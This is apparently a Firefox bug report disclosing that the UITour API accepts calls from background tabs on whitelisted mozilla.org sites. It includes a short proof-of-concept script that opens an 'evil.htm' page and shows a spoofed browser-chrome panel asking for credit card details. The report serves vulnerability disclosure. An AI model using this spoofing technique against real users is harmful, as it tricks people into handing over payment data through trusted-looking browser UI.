UITour: onPageEvent doesn't ignore API calls from background tabs

Screen Shot of example exploit

UITour annotations/behaviour is torn down when a non-Tour tab is selected but we aren't preventing UITour API calls from background tabs on the whitelist.

If one of the whitelisted mozilla.org websites was compromised, users could be tricked into taking an action on some other tab using showInfo (an info panel anchored in the browser chrome). The info panel can cover the address bar and doesn't dismiss with outside clicks (the X would have be clicked).

Example code you can run on https://www.mozilla.org/en-US/firefox/35.0a1/tour/ in the Web Console:

window.onclick = function () {
  window.open('https://people.mozilla.org/~mnoorenberghe/bugs/evil.htm')
  setTimeout(function () {
    Mozilla.UITour.showInfo('selectedTabIcon',
                            'Enter your credit card to purchase Mozilla Firefox!',
                            'Three easy payments of $9.99',
                            '//mozorg.cdn.mozilla.net/media/img/firefox/australis/logo.png?2014-03')
  }, 400)
}

Once you have run this, click anywhere in the empty area of the page to have the spoofing tab and info panel open.
